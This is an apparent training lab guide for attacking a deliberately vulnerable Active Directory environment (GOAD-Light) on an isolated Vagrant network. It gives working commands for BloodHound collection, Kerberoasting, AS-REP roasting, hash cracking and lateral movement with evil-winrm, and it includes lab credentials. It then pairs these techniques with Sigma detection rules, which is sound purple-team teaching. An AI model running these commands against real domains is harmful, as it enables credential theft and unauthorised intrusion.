# Lab 05 — Active Directory

**Module**: 05 — Active Directory Attack Paths  
**Lessons**: Kerberos attacks, BloodHound, lateral movement  
**Isolation**: private NAT'd Vagrant network  
**Time**: 4-8 hours (first boot is slow; the lab itself is the rest)

## Heads up — this is a heavyweight lab

Unlike the docker-compose labs, this one needs:

- Vagrant + VirtualBox (or libvirt/Hyper-V)
- 32 GB RAM minimum (4 VMs at ~6 GB each + overhead)
- 80 GB free disk
- An evening for the first boot (Windows boxes are slow)

If you don't have the hardware, skip this lab and use a hosted alternative
like HackTheBox, TryHackMe, or RangeForce AD modules.

## Recommended sources

Rather than ship a vagrant box ourselves (legal/licensing complications with
Windows Server eval ISOs), point at well-known free options:

- **GOAD** (Game of Active Directory): https://github.com/Orange-Cyberdefense/GOAD
  Multiple AD environments with deliberate misconfigurations and trusts.
- **AD-Attack-Defense** lab kits (community Vagrantfiles)
- **DetectionLab**: https://github.com/clong/DetectionLab
  Heavier — pairs the AD with full ELK + Velociraptor for purple-team work.

GOAD's `light` variant is the closest fit for what the toolkit's
`bloodhound-import.sh` and `bloodhound-query.sh` scripts exercise.

## Setup (GOAD-light example)

```bash
# Clone GOAD
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD/goad

# Pick the light lab
./goad.sh -t install -l GOAD-Light -p virtualbox -m local

# Wait. This takes 1-3 hours on a fast box.

# Once up, get the DC IP from the lab inventory
cat ad/GOAD-Light/data/inventory
```

## Attach the toolkit

```bash
# Toolkit container with route to the GOAD network
docker run --rm -it \
  --network host \
  -v "$PWD/work:/work" \
  -w /work \
  --add-host="winterfell.north.sevenkingdoms.local:<DC-IP>" \
  secops-toolkit bash

# Inside toolkit:
./scripts/engagement-init.sh adlab --type ad
```

## Exercises

### Exercise 1 — BloodHound collection

```bash
# Set up a passwords file (don't pass on command line)
echo 'samwell.tarly:Heartsbane' > ~/.bh-pw

./scripts/bloodhound-import.sh collect \
  --domain north.sevenkingdoms.local \
  --dc <DC-IP> \
  --username samwell.tarly \
  --password-file ~/.bh-pw \
  --engagement adlab

# Confirm Neo4j is populated
./scripts/bloodhound-import.sh status
```

### Exercise 2 — Run all 19 pre-built queries

```bash
./scripts/bloodhound-query.sh --query shortest-path-to-da --output paths-to-da.json
./scripts/bloodhound-query.sh --query kerberoastable --output kerberoastable.json
./scripts/bloodhound-query.sh --query asreproastable --output asreproastable.json
./scripts/bloodhound-query.sh --query unconstrained-delegation --output unconstrained.json
./scripts/bloodhound-query.sh --query rbcd-targets --output rbcd.json
./scripts/bloodhound-query.sh --query laps-readers --output laps-readers.json
# ... etc, see --list
```

Document one viable attack path per query that returns results.

### Exercise 3 — Kerberoasting

```bash
impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:Heartsbane \
  -dc-ip <DC-IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

Crack at least one service account. Document the recovered credential.

### Exercise 4 — AS-REP Roasting

```bash
# Find users without preauth
./scripts/bloodhound-query.sh --query asreproastable

# Roast them
impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile asrep-users.txt \
  -no-pass -dc-ip <DC-IP> -outputfile asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 5 — Lateral via WinRM

Lateral move using `evil-winrm` with the cracked credential. Confirm shell on
the target. Document the lateral movement technique used and what data sources
would have caught it (Sec 4624 Type 3, WSMan ETW, etc.).

### Exercise 6 — Detection rules

For each technique you used, generate the matching Sigma rule:

```bash
./scripts/sigma-rule-builder.sh --technique T1558.003 --incident-id adlab
./scripts/sigma-rule-builder.sh --technique T1558.004 --incident-id adlab
./scripts/sigma-rule-builder.sh --technique T1021.006 --incident-id adlab
```

Tune them against any seed logs your lab produces.

## Success criteria

- [ ] BloodHound graph loaded with >100 nodes
- [ ] At least one shortest-path-to-DA chain identified and documented
- [ ] One kerberoasted credential cracked
- [ ] One AS-REP roasted credential cracked
- [ ] One successful lateral movement
- [ ] Sigma rules for each technique exercised
- [ ] Findings exported via `report-generator.py`

## Tear down

```bash
cd GOAD/goad
./goad.sh -t destroy -l GOAD-Light -p virtualbox
```

Keep the report — restoring the lab is slow.
